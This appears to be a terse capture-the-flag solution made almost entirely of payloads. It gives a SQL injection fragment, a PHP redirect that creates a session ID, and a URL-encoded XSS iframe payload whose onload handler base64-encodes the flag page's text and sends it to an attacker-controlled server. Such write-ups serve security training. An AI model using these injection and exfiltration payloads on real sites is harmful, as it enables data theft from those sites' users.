**Short Solution:** 
 - For SQLI: `lcase('inKypinKy') as id from dual`
 - Creating UID: Host a webpage that has the following php code `header("location:http://web/user.php?session=1111-22222-1234&sub=submit%22);`
 - Retrieving Flag: Host a webpage that has the following php code `header("location:http://web/flag.php?session%3D%22%3E%3Ciframe+id%3D%22a%22+src%3D%22http%3A%2F%2Fweb%2Fflag.php%3Fsession%3D1111-22222-1234%26sub%3Dsubmit%22+onload%3Dwindow.location%3D%22<your_server>%3F%22%2Bbtoa%28document.getElementById%28%27a%27%29.contentWindow.document.body.innerText%29%3E%26sub%3Dsubmit%22%29%3B`
